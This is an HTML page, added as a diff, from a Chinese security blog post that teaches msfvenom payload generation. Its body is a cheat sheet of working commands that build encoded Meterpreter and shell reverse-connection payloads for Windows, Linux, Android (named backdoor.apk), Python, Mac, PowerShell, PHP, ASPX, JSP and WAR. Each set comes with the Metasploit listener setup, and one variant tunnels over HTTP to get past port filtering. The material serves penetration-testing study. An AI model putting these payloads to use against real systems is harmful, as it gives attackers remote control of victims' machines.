@@ -1,0 +1,524 @@
+<!DOCTYPE html>
+<html>
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="utf-8">
+  
+  <title>Metasploit学习系列之msfvenom生成payload | 黑客技术学习分享自留地</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  
+    <meta name="keywords" content="Sh4dow's  Blog">
+  
+  <meta name="description" content="MSFvenom 是一个组合了 Msfpayload、Msfencode工具为一体的一个框架，主要用来生成Payload.">
+<meta name="keywords" content="Payload,Msfvenom">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Metasploit学习系列之msfvenom生成payload">
+<meta property="og:url" content="https://sakuxa.com/2019/05/26/msf系列之msfvenom/index.html">
+<meta property="og:site_name" content="黑客技术学习分享自留地">
+<meta property="og:description" content="MSFvenom 是一个组合了 Msfpayload、Msfencode工具为一体的一个框架，主要用来生成Payload.">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="https://sakuxa.com/2019/05/26/msf系列之msfvenom/QQ截图20190527090256.png">
+<meta property="og:image" content="https://sakuxa.com/2019/05/26/msf系列之msfvenom/QQ截图20190527085802.png">
+<meta property="og:image" content="https://sakuxa.com/2019/05/26/msf系列之msfvenom/QQ截图20190527094641.png">
+<meta property="og:image" content="https://sakuxa.com/2019/05/26/msf系列之msfvenom/QQ截图20190527091330.png">
+<meta property="og:image" content="https://sakuxa.com/2019/05/26/msf系列之msfvenom/QQ截图20190527103747.png">
+<meta property="og:image" content="https://sakuxa.com/2019/05/26/msf系列之msfvenom/QQ截图20190527104635.png">
+<meta property="og:image" content="https://sakuxa.com/2019/05/26/msf系列之msfvenom/QQ截图20190527190254.png">
+<meta property="og:image" content="https://sakuxa.com/2019/05/26/msf系列之msfvenom/QQ截图20190527111048.png">
+<meta property="og:image" content="https://sakuxa.com/2019/05/26/msf系列之msfvenom/QQ截图20190527173037.png">
+<meta property="og:image" content="https://sakuxa.com/2019/05/26/msf系列之msfvenom/QQ截图20190527173858.png">
+<meta property="og:updated_time" content="2019-05-27T11:24:00.511Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Metasploit学习系列之msfvenom生成payload">
+<meta name="twitter:description" content="MSFvenom 是一个组合了 Msfpayload、Msfencode工具为一体的一个框架，主要用来生成Payload.">
+<meta name="twitter:image" content="https://sakuxa.com/2019/05/26/msf系列之msfvenom/QQ截图20190527090256.png">
+  
+  
+    <link rel="icon" href="/LimeWire.png">
+  
+  <link href="//cdn.bootcss.com/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet" type="text/css">
+  <link rel="stylesheet" href="/css/style.css">
+  <script src="/js/pace.min.js"></script>
+  
+
+  
+  
+
+</head>
+</html>
+<body>
+  <div id="container">
+      <header id="header">
+    <div id="banner"></div>
+    <div id="header-outer">
+        <div id="header-menu" class="header-menu-pos animated">
+            <div class="header-menu-container">
+                <a href="/" class="left">
+                    <span class="site-title">Sh4dow&#39;s Blog</span>
+                </a>
+                <nav id="header-menu-nav" class="right">
+                    
+                    <a href="/">
+                        <i class="fa fa-home"></i>
+                        <span>Home</span>
+                    </a>
+                    
+                    <a href="/archives">
+                        <i class="fa fa-archive"></i>
+                        <span>Archives</span>
+                    </a>
+                    
+                    <a href="/about">
+                        <i class="fa fa-user"></i>
+                        <span>About</span>
+                    </a>
+                    
+                </nav>
+                <a class="mobile-header-menu-button">
+                    <i class="fa fa-bars"></i>
+                </a>
+            </div>
+        </div>
+        <div id="header-row">
+            <div id="logo">
+                <a href="/">
+                    <img src="/images/avatar1.png" alt="logo">
+                </a>
+            </div>
+            <div class="header-info">
+                <div id="header-title">
+                    
+                </div>
+                <div id="header-description">
+                    
+                    <h3>
+                        不能成为自己喜欢的人，至少成为自己认可的黑客。
+                    </h3>
+                    
+                </div>
+            </div>
+            <nav class="header-nav">
+                <div class="social">
+                    
+                        <a title="Home" target="_blank" href="https://sakuxa.com">
+                            <i class="fa fa-home fa-2x"></i></a>
+                    
+                        <a title="Github" target="_blank" href="https://github.com/sh4douu">
+                            <i class="fa fa-github fa-2x"></i></a>
+                    
+                        <a title="Weibo" target="_blank" href="https://sakuxa.com">
+                            <i class="fa fa-weibo fa-2x"></i></a>
+                    
+                        <a title="Twitter" target="_blank" href="https://sakuxa.com">
+                            <i class="fa fa-twitter fa-2x"></i></a>
+                    
+                </div>
+            </nav>
+        </div>
+    </div>
+</header>
+      <div class="outer">
+        <section id="main" class="body-wrap"><article id="post-msf系列之msfvenom" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 class="post-title" itemprop="name">
+      Metasploit学习系列之msfvenom生成payload
+    </h1>
+    <div class="post-title-bar">
+      <ul>
+          
+              <li>
+                  <i class="fa fa-book"></i>
+                  
+                      <a href="/categories/Metasploit/">Metasploit</a>
+                  
+              </li>
+          
+        <li>
+          <i class="fa fa-calendar"></i>  2019-05-26
+        </li>
+        <li>
+          <i class="fa fa-eye"></i>
+          <span id="busuanzi_value_page_pv"></span>
+        </li>
+      </ul>
+    </div>
+  
+
+          
+      </header>
+    
+    <div class="article-entry post-content" itemprop="articleBody">
+      
+            
+            <blockquote>
+<p><em>MSFvenom</em> 是一个组合了 Msfpayload、Msfencode工具为一体的一个框架，主要用来生成Payload. </p>
+</blockquote>
+<a id="more"></a>
+<h3 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h3><p><strong>0x00 反弹meterpreter（x86）</strong></p>
+<ul>
+<li><code>msfvenom  -p windows/meterpreter/reverse_tcp lhost=192.168.1.102 lport=4444 -b &#39;\x00\x0a\xff&#39; -f exe -e x86/shikata_ga_nai -i 4 -o payload32.exe</code></li>
+</ul>
+<p>在不指定架构（<code>-a &lt;arch&gt;</code>）和平台（<code>--platform</code>）时，Msfvenom会根据Payload自动选择（可以在指定payload后用<code>--list-options</code>查看）。</p>
+<p><img src="/2019/05/26/msf系列之msfvenom/QQ截图20190527090256.png" alt></p>
+<p>该模块默认选择平台为Windows，选择架构为x86。</p>
+<p><img src="/2019/05/26/msf系列之msfvenom/QQ截图20190527085802.png" alt></p>
+<ul>
+<li><p><strong>本地监听端口，等待反弹</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">msf5 &gt; use exploit/multi/handler</span><br><span class="line">msf5 exploit(multi/handler) &gt; set payload windows/meterpreter/reverse_tcp</span><br><span class="line">msf5 exploit(multi/handler) &gt; set lhost 192.168.1.102</span><br><span class="line">msf5 exploit(multi/handler) &gt; set lport 4444</span><br><span class="line">msf5 exploit(multi/handler) &gt; exploit</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+<p><img src="/2019/05/26/msf系列之msfvenom/QQ截图20190527094641.png" alt></p>
+<p><strong>0x01 反弹meterpreter（x64）</strong></p>
+<ul>
+<li><code>msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.1.102 lport=4444 -b &#39;\x00\x0a\xff&#39; -f exe -e x86/shikata_ga_nai -i 4 -o payload64.exe</code></li>
+</ul>
+<p><img src="/2019/05/26/msf系列之msfvenom/QQ截图20190527091330.png" alt></p>
+<p><strong>0x02 反弹meterpreter（x86）over HTTP</strong></p>
+<blockquote>
+<ul>
+<li>可能会遇到这么一种情况，即目标主机或目标主机网络环境过滤了多余的端口，只允许一些关键端口（如，HTTP、HTTPS）的流量通过。那么我们就可以将我们的流量封装在HTTP或HTTPS协议中以逃避过滤规则。</li>
+</ul>
+</blockquote>
+<ul>
+<li><code>msfvenom -p windows/meterpreter/reverse_http  lhost=192.168.1.102 lport=80 -b &#39;\x00\x0a\xff&#39; -f exe -e x86/shikata_ga_nai -i 4 -o payloadhttp.exe</code></li>
+</ul>
+<p>设置监听：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">msf5 &gt; use exploit/multi/handler</span><br><span class="line">msf5 exploit(multi/handler) &gt; set payload windows/meterpreter/reverse_http</span><br><span class="line">msf5 exploit(multi/handler) &gt; set lhost 192.168.1.102</span><br><span class="line">msf5 exploit(multi/handler) &gt; set lport 80</span><br><span class="line">msf5 exploit(multi/handler) &gt; exploit</span><br></pre></td></tr></table></figure>
+<p>对比reverse_tcp与reverse_http的数据封装情况：</p>
+<ul>
+<li>使用<code>windows/x64/meterpreter/reverse_tcp</code>为Payload时抓取数据包：</li>
+</ul>
+<p><img src="/2019/05/26/msf系列之msfvenom/QQ截图20190527103747.png" alt></p>
+<ul>
+<li>使用<code>windows/meterpreter/reverse_http</code>为Payload时抓取数据包，可以发现数据以URL部分被进行传输：</li>
+</ul>
+<p><img src="/2019/05/26/msf系列之msfvenom/QQ截图20190527104635.png" alt></p>
+<blockquote>
+<ul>
+<li>PS：若是HTTPS，把Payload改为HTTPS即可。</li>
+</ul>
+</blockquote>
+<h3 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h3><ul>
+<li><p><code>msfvenom -p linux/x86/meterpreter/reverse_tcp  lhost=192.168.1.102 lport=4444  -f elf  -o shell.elf</code></p>
+</li>
+<li><p>监听：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">msf5 &gt; use exploit/multi/handler</span><br><span class="line">msf5 exploit(multi/handler) &gt; set linux/x86/meterpreter/reverse_tcp</span><br><span class="line">msf5 exploit(multi/handler) &gt; set lhost 192.168.1.102</span><br><span class="line">msf5 exploit(multi/handler) &gt; set lport 4444</span><br><span class="line">msf5 exploit(multi/handler) &gt; exploit</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+<p><img src="/2019/05/26/msf系列之msfvenom/QQ截图20190527190254.png" alt></p>
+<h3 id="Android"><a href="#Android" class="headerlink" title="Android"></a>Android</h3><ul>
+<li><p><code>msfvenom -p android/meterpreter/reverse_tcp  lhost=192.168.1.102 lport=4444  -o backdoor.apk</code></p>
+</li>
+<li><p>监听：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">msf5 &gt; use exploit/multi/handler</span><br><span class="line">msf5 exploit(multi/handler) &gt; set android/meterpreter/reverse_tcp</span><br><span class="line">msf5 exploit(multi/handler) &gt; set lhost 192.168.1.102</span><br><span class="line">msf5 exploit(multi/handler) &gt; set lport 4444</span><br><span class="line">msf5 exploit(multi/handler) &gt; exploit</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+<h3 id="Python"><a href="#Python" class="headerlink" title="Python"></a>Python</h3><ul>
+<li><code>msfvenom -p python/meterpreter/reverse_tcp  lhost=192.168.1.102 lport=4444  -f raw  -o payload1.py</code></li>
+</ul>
+<p><img src="/2019/05/26/msf系列之msfvenom/QQ截图20190527111048.png" alt></p>
+<ul>
+<li><p>设置监听：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">msf5 &gt; use exploit/multi/handler</span><br><span class="line">msf5 exploit(multi/handler) &gt; set payload python/meterpreter/reverse_tcp</span><br><span class="line">msf5 exploit(multi/handler) &gt; set lhost 192.168.1.102</span><br><span class="line">msf5 exploit(multi/handler) &gt; set lport 4444</span><br><span class="line">msf5 exploit(multi/handler) &gt; exploit</span><br></pre></td></tr></table></figure>
+<p>受害主机执行：</p>
+<p><img src="/2019/05/26/msf系列之msfvenom/QQ截图20190527173037.png" alt></p>
+</li>
+<li><p><code>msfvenom -p python/meterpreter/reverse_tcp  lhost=192.168.1.102 lport=4444  -f python  -o payload.py</code></p>
+<ul>
+<li><code>-f python</code>或<code>-f py</code>时，内容为十六进制：</li>
+</ul>
+</li>
+</ul>
+<p><img src="/2019/05/26/msf系列之msfvenom/QQ截图20190527173858.png" alt></p>
+<h3 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h3><p><strong>Mac</strong></p>
+<ul>
+<li><code>msfvenom -a x86 --platform osx -p osx/x86/shell_reverse_tcp lhost=攻击机IP  lport=攻击机port  -f macho -o payload.macho</code></li>
+</ul>
+<p><strong>Powershell</strong></p>
+<ul>
+<li><code>msfvenom -a x86 --platform Windows -p windows/powershell_reverse_tcp lhost=攻击机IP  lport=攻击机PORT -e cmd/powershell_base64 -i 3 -f raw -o payload.ps1</code></li>
+</ul>
+<p><strong>PHP</strong></p>
+<ul>
+<li><code>msfvenom -p php/meterpreter_reverse_tcp  lhost=攻击机IP  lport=攻击机port  -f raw  -o shell.php</code></li>
+</ul>
+<p><strong>aspx</strong></p>
+<ul>
+<li><code>msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp lhost=攻击机IP  lport=攻击机port -f aspx -o payload.aspx</code></li>
+</ul>
+<p><strong>JSP</strong></p>
+<ul>
+<li><code>msfvenom --platform java -p java/jsp_shell_reverse_tcp lhost=攻击机IP  lport=攻击机port -f raw -o payload.jsp</code></li>
+</ul>
+<p><strong>WAR</strong></p>
+<ul>
+<li><code>msfvenom -p java/jsp_shell_reverse_tcp lhost=攻击机IP  lport=攻击机port -f raw -o payload.war</code></li>
+</ul>
+<h4 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h4><p><a href="https://www.hackingarticles.in/msfvenom-tutorials-beginners/" target="_blank" rel="noopener">https://www.hackingarticles.in/msfvenom-tutorials-beginners/</a></p>
+
+            <div class="post-copyright">
+    <div class="content">
+        <p>最后更新： 2019年05月27日 19:24</p>
+        <p>原始链接： <a class="post-url" href="/2019/05/26/msf系列之msfvenom/" title="Metasploit学习系列之msfvenom生成payload">https://sakuxa.com/2019/05/26/msf系列之msfvenom/</a></p>
+        <footer>
+            <a href="https://sakuxa.com">
+                <img src="/images/avatar1.png" alt="sh4douu">
+                sh4douu
+            </a>
+        </footer>
+    </div>
+</div>
+
+      
+        
+            
+
+        
+    </div>
+    <footer class="article-footer">
+        
+        
+<div class="post-share">
+    <a href="javascript:;" id="share-sub" class="post-share-fab">
+        <i class="fa fa-share-alt"></i>
+    </a>
+    <div class="post-share-list" id="share-list">
+        <ul class="share-icons">
+          <li>
+            <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=https://sakuxa.com/2019/05/26/msf系列之msfvenom/&title=《Metasploit学习系列之msfvenom生成payload》 — 黑客技术学习分享自留地&pic=images/timgmsf.jpg" data-title="微博">
+              <i class="fa fa-weibo"></i>
+            </a>
+          </li>
+          <li>
+            <a class="weixin share-sns" id="wxFab" href="javascript:;" data-title="微信">
+              <i class="fa fa-weixin"></i>
+            </a>
+          </li>
+          <li>
+            <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=https://sakuxa.com/2019/05/26/msf系列之msfvenom/&title=《Metasploit学习系列之msfvenom生成payload》 — 黑客技术学习分享自留地&source=
+MSFvenom 是一个组合了 Msfpayload、Msfencode工具为一体的一个框架，主要用来生成Payload. 
+" data-title="QQ">
+              <i class="fa fa-qq"></i>
+            </a>
+          </li>
+          <li>
+            <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=https://sakuxa.com/2019/05/26/msf系列之msfvenom/" data-title="Facebook">
+              <i class="fa fa-facebook"></i>
+            </a>
+          </li>
+          <li>
+            <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《Metasploit学习系列之msfvenom生成payload》 — 黑客技术学习分享自留地&url=https://sakuxa.com/2019/05/26/msf系列之msfvenom/&via=https://sakuxa.com" data-title="Twitter">
+              <i class="fa fa-twitter"></i>
+            </a>
+          </li>
+          <li>
+            <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=https://sakuxa.com/2019/05/26/msf系列之msfvenom/" data-title="Google+">
+              <i class="fa fa-google-plus"></i>
+            </a>
+          </li>
+        </ul>
+     </div>
+</div>
+<div class="post-modal wx-share" id="wxShare">
+    <a class="close" href="javascript:;" id="wxShare-close">×</a>
+    <p>扫一扫，分享到微信</p>
+    <img src="//api.qrserver.com/v1/create-qr-code/?data=https://sakuxa.com/2019/05/26/msf系列之msfvenom/" alt="微信分享二维码">
+</div>
+
+<div class="mask"></div>
+
+        
+        <ul class="article-footer-menu">
+            
+            
+  <li class="article-footer-tags">
+    <i class="fa fa-tags"></i>
+      
+    <a href="/tags/Payload/" class="color3">Payload</a>
+      
+    <a href="/tags/Msfvenom/" class="color4">Msfvenom</a>
+      
+  </li>
+
+        </ul>
+        
+    </footer>
+  </div>
+</article>
+
+
+    <aside class="post-toc-pos post-toc-top" id="post-toc">
+        <nav class="post-toc-wrap">
+            <ol class="post-toc"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#Windows"><span class="post-toc-text">Windows</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#Linux"><span class="post-toc-text">Linux</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#Android"><span class="post-toc-text">Android</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#Python"><span class="post-toc-text">Python</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#其他"><span class="post-toc-text">其他</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#参考链接"><span class="post-toc-text">参考链接</span></a></li></ol></li></ol>
+        </nav>
+    </aside>
+    
+
+<nav id="article-nav">
+  
+    <a href="/2019/05/28/msf系列之msfvenom02/" id="article-nav-newer" class="article-nav-link-wrap">
+
+      <span class="article-nav-title">
+        <i class="fa fa-hand-o-left" aria-hidden="true"></i>
+        
+          Metasploit学习系列之一句话反弹shell
+        
+      </span>
+    </a>
+  
+  
+    <a href="/2019/05/19/01无线渗透-基础知识/" id="article-nav-older" class="article-nav-link-wrap">
+      <span class="article-nav-title">无线渗透：Chapter 1-基础知识</span>
+      <i class="fa fa-hand-o-right" aria-hidden="true"></i>
+    </a>
+  
+</nav>
+
+
+
+    
+</section>
+        
+      </div>
+      <footer id="footer">
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      
+<p>
+    <span id="busuanzi_container_site_uv" style="display:none">
+        总访客数：<span id="busuanzi_value_site_uv"></span>
+    </span>
+    <span id="busuanzi_container_site_pv" style="display:none">
+        总访问量：<span id="busuanzi_value_site_pv"></span>
+    </span>
+</p>
+
+
+      <p>
+        Powered by  <a href="http://hexo.io/" target="_blank">Hexo</a>
+        Theme <a href="//github.com/wongminho/hexo-theme-miho" target="_blank">MiHo</a>
+      &copy; 2019 sh4douu<br>
+      </p>
+    </div>
+  </div>
+</footer>
+    <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+<script src="//cdn.bootcss.com/jquery/3.2.1/jquery.min.js"></script>
+<script>
+  var mihoConfig = {
+      root: "https://sakuxa.com",
+      animate: true,
+      isHome: false,
+      share: true,
+      reward: 0
+  }
+</script>
+<div class="sidebar">
+    <div id="sidebar-search" title="Search">
+        <i class="fa fa-search"></i>
+    </div>
+    <div id="sidebar-category" title="Categories">
+        <i class="fa fa-book"></i>
+    </div>
+    <div id="sidebar-tag" title="Tags">
+        <i class="fa fa-tags"></i>
+    </div>
+    <div id="sidebar-top">
+        <span class="sidebar-top-icon"><i class="fa fa-angle-up"></i></span>
+    </div>
+</div>
+<div class="sidebar-menu-box" id="sidebar-menu-box">
+    <div class="sidebar-menu-box-container">
+        <div id="sidebar-menu-box-categories">
+            <a class="category-link" href="/categories/Metasploit/">Metasploit</a><a class="category-link" href="/categories/Misc/">Misc</a><a class="category-link" href="/categories/Pikachu/">Pikachu</a><a class="category-link" href="/categories/Python/">Python</a><a class="category-link" href="/categories/Vulnhub/">Vulnhub</a><a class="category-link" href="/categories/WEB漏洞学习/">WEB漏洞学习</a><a class="category-link" href="/categories/Win32/">Win32</a><a class="category-link" href="/categories/内网渗透/">内网渗透</a><a class="category-link" href="/categories/无线渗透/">无线渗透</a><a class="category-link" href="/categories/漏洞复现/">漏洞复现</a><a class="category-link" href="/categories/语言/">语言</a>
+        </div>
+        <div id="sidebar-menu-box-tags">
+            <a href="/tags/802-11/" style="font-size: 10px;">802.11</a> <a href="/tags/CSRF/" style="font-size: 10px;">CSRF</a> <a href="/tags/CTF/" style="font-size: 10px;">CTF</a> <a href="/tags/Getshell/" style="font-size: 10px;">Getshell</a> <a href="/tags/HTML文档解析/" style="font-size: 10px;">HTML文档解析</a> <a href="/tags/Kerberos/" style="font-size: 10px;">Kerberos</a> <a href="/tags/Language/" style="font-size: 20px;">Language</a> <a href="/tags/Linux/" style="font-size: 10px;">Linux</a> <a href="/tags/Mimikatz/" style="font-size: 10px;">Mimikatz</a> <a href="/tags/Msfvenom/" style="font-size: 11.67px;">Msfvenom</a> <a href="/tags/My-Ubuntu/" style="font-size: 10px;">My Ubuntu</a> <a href="/tags/MySQL/" style="font-size: 10px;">MySQL</a> <a href="/tags/NTLM/" style="font-size: 10px;">NTLM</a> <a href="/tags/NetBIOS/" style="font-size: 10px;">NetBIOS</a> <a href="/tags/OWASP-Top10-2017/" style="font-size: 10px;">OWASP Top10 2017</a> <a href="/tags/PHP/" style="font-size: 10px;">PHP</a> <a href="/tags/PHPCMSv9/" style="font-size: 10px;">PHPCMSv9</a> <a href="/tags/Pass-The-Hash/" style="font-size: 10px;">Pass The Hash</a> <a href="/tags/Payload/" style="font-size: 10px;">Payload</a> <a href="/tags/Python基础/" style="font-size: 18.33px;">Python基础</a> <a href="/tags/Python模块/" style="font-size: 13.33px;">Python模块</a> <a href="/tags/Re/" style="font-size: 10px;">Re</a> <a href="/tags/Reverse-shell/" style="font-size: 10px;">Reverse shell</a> <a href="/tags/SMB/" style="font-size: 10px;">SMB</a> <a href="/tags/SQL注入/" style="font-size: 10px;">SQL注入</a> <a href="/tags/Ubuntu-2-Mac/" style="font-size: 10px;">Ubuntu 2 Mac</a> <a href="/tags/WEB安全/" style="font-size: 13.33px;">WEB安全</a> <a href="/tags/WLAN/" style="font-size: 10px;">WLAN</a> <a href="/tags/Win32/" style="font-size: 16.67px;">Win32</a> <a href="/tags/Winodows/" style="font-size: 10px;">Winodows</a> <a href="/tags/XML/" style="font-size: 10px;">XML</a> <a href="/tags/XML注入/" style="font-size: 10px;">XML注入</a> <a href="/tags/XSS/" style="font-size: 15px;">XSS</a> <a href="/tags/XXE/" style="font-size: 11.67px;">XXE</a> <a href="/tags/base64/" style="font-size: 10px;">base64</a> <a href="/tags/subprocess/" style="font-size: 10px;">subprocess</a> <a href="/tags/任意文件下载/" style="font-size: 10px;">任意文件下载</a> <a href="/tags/干货/" style="font-size: 10px;">干货</a> <a href="/tags/必会技能/" style="font-size: 10px;">必会技能</a> <a href="/tags/技术/" style="font-size: 10px;">技术</a> <a href="/tags/收集/" style="font-size: 10px;">收集</a> <a href="/tags/文件上传/" style="font-size: 10px;">文件上传</a> <a href="/tags/文件包含/" style="font-size: 10px;">文件包含</a> <a href="/tags/文件描述符/" style="font-size: 10px;">文件描述符</a> <a href="/tags/文件权限/" style="font-size: 10px;">文件权限</a> <a href="/tags/无线渗透/" style="font-size: 10px;">无线渗透</a> <a href="/tags/暴力破解/" style="font-size: 10px;">暴力破解</a> <a href="/tags/权限提升/" style="font-size: 10px;">权限提升</a> <a href="/tags/汇编语言/" style="font-size: 16.67px;">汇编语言</a> <a href="/tags/环境搭建/" style="font-size: 10px;">环境搭建</a> <a href="/tags/管道/" style="font-size: 10px;">管道</a> <a href="/tags/编码与解码/" style="font-size: 10px;">编码与解码</a> <a href="/tags/跨站请求伪造/" style="font-size: 10px;">跨站请求伪造</a> <a href="/tags/过滤与绕过/" style="font-size: 10px;">过滤与绕过</a> <a href="/tags/重定向/" style="font-size: 10px;">重定向</a> <a href="/tags/靶场/" style="font-size: 15px;">靶场</a> <a href="/tags/靶机/" style="font-size: 10px;">靶机</a>
+        </div>
+    </div>
+    <a href="javascript:;" class="sidebar-menu-box-close">&times;</a>
+</div>
+<div class="mobile-header-menu-nav" id="mobile-header-menu-nav">
+    <div class="mobile-header-menu-container">
+        <span class="title">Menus</span>
+        <ul class="mobile-header-menu-navbar">
+            
+            <li>
+                <a href="/">
+                    <i class="fa fa-home"></i><span>Home</span>
+                </a>
+            </li>
+            
+            <li>
+                <a href="/archives">
+                    <i class="fa fa-archive"></i><span>Archives</span>
+                </a>
+            </li>
+            
+            <li>
+                <a href="/about">
+                    <i class="fa fa-user"></i><span>About</span>
+                </a>
+            </li>
+            
+        </ul>
+    </div>
+    <div class="mobile-header-tag-container">
+        <span class="title">Tags</span>
+        <div id="mobile-header-container-tags">
+            <a href="/tags/802-11/" style="font-size: 10px;">802.11</a> <a href="/tags/CSRF/" style="font-size: 10px;">CSRF</a> <a href="/tags/CTF/" style="font-size: 10px;">CTF</a> <a href="/tags/Getshell/" style="font-size: 10px;">Getshell</a> <a href="/tags/HTML文档解析/" style="font-size: 10px;">HTML文档解析</a> <a href="/tags/Kerberos/" style="font-size: 10px;">Kerberos</a> <a href="/tags/Language/" style="font-size: 20px;">Language</a> <a href="/tags/Linux/" style="font-size: 10px;">Linux</a> <a href="/tags/Mimikatz/" style="font-size: 10px;">Mimikatz</a> <a href="/tags/Msfvenom/" style="font-size: 11.67px;">Msfvenom</a> <a href="/tags/My-Ubuntu/" style="font-size: 10px;">My Ubuntu</a> <a href="/tags/MySQL/" style="font-size: 10px;">MySQL</a> <a href="/tags/NTLM/" style="font-size: 10px;">NTLM</a> <a href="/tags/NetBIOS/" style="font-size: 10px;">NetBIOS</a> <a href="/tags/OWASP-Top10-2017/" style="font-size: 10px;">OWASP Top10 2017</a> <a href="/tags/PHP/" style="font-size: 10px;">PHP</a> <a href="/tags/PHPCMSv9/" style="font-size: 10px;">PHPCMSv9</a> <a href="/tags/Pass-The-Hash/" style="font-size: 10px;">Pass The Hash</a> <a href="/tags/Payload/" style="font-size: 10px;">Payload</a> <a href="/tags/Python基础/" style="font-size: 18.33px;">Python基础</a> <a href="/tags/Python模块/" style="font-size: 13.33px;">Python模块</a> <a href="/tags/Re/" style="font-size: 10px;">Re</a> <a href="/tags/Reverse-shell/" style="font-size: 10px;">Reverse shell</a> <a href="/tags/SMB/" style="font-size: 10px;">SMB</a> <a href="/tags/SQL注入/" style="font-size: 10px;">SQL注入</a> <a href="/tags/Ubuntu-2-Mac/" style="font-size: 10px;">Ubuntu 2 Mac</a> <a href="/tags/WEB安全/" style="font-size: 13.33px;">WEB安全</a> <a href="/tags/WLAN/" style="font-size: 10px;">WLAN</a> <a href="/tags/Win32/" style="font-size: 16.67px;">Win32</a> <a href="/tags/Winodows/" style="font-size: 10px;">Winodows</a> <a href="/tags/XML/" style="font-size: 10px;">XML</a> <a href="/tags/XML注入/" style="font-size: 10px;">XML注入</a> <a href="/tags/XSS/" style="font-size: 15px;">XSS</a> <a href="/tags/XXE/" style="font-size: 11.67px;">XXE</a> <a href="/tags/base64/" style="font-size: 10px;">base64</a> <a href="/tags/subprocess/" style="font-size: 10px;">subprocess</a> <a href="/tags/任意文件下载/" style="font-size: 10px;">任意文件下载</a> <a href="/tags/干货/" style="font-size: 10px;">干货</a> <a href="/tags/必会技能/" style="font-size: 10px;">必会技能</a> <a href="/tags/技术/" style="font-size: 10px;">技术</a> <a href="/tags/收集/" style="font-size: 10px;">收集</a> <a href="/tags/文件上传/" style="font-size: 10px;">文件上传</a> <a href="/tags/文件包含/" style="font-size: 10px;">文件包含</a> <a href="/tags/文件描述符/" style="font-size: 10px;">文件描述符</a> <a href="/tags/文件权限/" style="font-size: 10px;">文件权限</a> <a href="/tags/无线渗透/" style="font-size: 10px;">无线渗透</a> <a href="/tags/暴力破解/" style="font-size: 10px;">暴力破解</a> <a href="/tags/权限提升/" style="font-size: 10px;">权限提升</a> <a href="/tags/汇编语言/" style="font-size: 16.67px;">汇编语言</a> <a href="/tags/环境搭建/" style="font-size: 10px;">环境搭建</a> <a href="/tags/管道/" style="font-size: 10px;">管道</a> <a href="/tags/编码与解码/" style="font-size: 10px;">编码与解码</a> <a href="/tags/跨站请求伪造/" style="font-size: 10px;">跨站请求伪造</a> <a href="/tags/过滤与绕过/" style="font-size: 10px;">过滤与绕过</a> <a href="/tags/重定向/" style="font-size: 10px;">重定向</a> <a href="/tags/靶场/" style="font-size: 15px;">靶场</a> <a href="/tags/靶机/" style="font-size: 10px;">靶机</a>
+        </div>
+    </div>
+</div>
+<div class="search-wrap">
+    <span class="search-close">&times;</span>
+        <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="back">
+            <i class="icon icon-lg icon-chevron-left"></i>
+        </a>
+        <input class="search-field" placeholder="Search..." id="keywords">
+        <a id="search-submit" href="javascript:;">
+            <i class="fa fa-search"></i>
+        </a>
+    <div class="search-container" id="search-container">
+        <ul class="search-result" id="search-result">
+        </ul>
+    </div>
+</div>
+
+<div id="search-tpl">
+    <li class="search-result-item">
+        <a href="{url}" class="search-item-li">
+            <span class="search-item-li-title" title="{title}">{title}</span>
+        </a>
+    </li>
+</div>
+<script src="/js/search.js"></script>
+<script src="/js/main.js"></script>
+
+
+  <script src="//cdn.bootcss.com/particles.js/2.0.0/particles.min.js"></script>
+  <div id="particles"></div>
+  <script src="/js/particles.js"></script>
+
+
+
+
+
+
+
